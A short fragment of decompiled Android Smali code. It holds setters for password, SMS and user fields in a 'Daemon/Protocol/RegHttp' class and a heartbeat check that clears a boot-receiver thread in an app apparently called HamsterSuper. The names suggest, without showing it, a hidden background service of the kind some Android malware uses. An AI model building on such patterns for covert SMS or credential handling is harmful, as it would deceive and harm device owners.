    .param p1, "passWord"    # Ljava/lang/String;

    .prologue
    .line 123
    iput-object p1, p0, LDaemon/Protocol/RegHttp;->passWord:Ljava/lang/String;

    .line 124
    return-void
.end method

.method public setSms(I)V
    .locals 0
    .param p1, "sms"    # I

    .prologue
    .line 107
    iput p1, p0, LDaemon/Protocol/RegHttp;->sms:I

    .line 108
    return-void
.end method

.method public setuser_value(Ljava/lang/String;)V
    .locals 0
    .param p1, "z"    # Ljava/lang/String;

    .prologue
    .line 133
    iput-object p1, p0, LDaemon/Protocol/RegHttp;->z:Ljava/lang/String;

    .line 134
    return-void
.end method

.method public starthead(Ljava/lang/String;)V
    .locals 2
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    .line 196
    const-string v1, "heartbeat"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 197
    .local v0, "heartbeat_value":Ljava/lang/String;
    if-eqz v0, :cond_0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_0

    .line 198
    const/4 v1, 0x0

    sput-object v1, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    .line 199
    :cond_0
    return-void
.end method
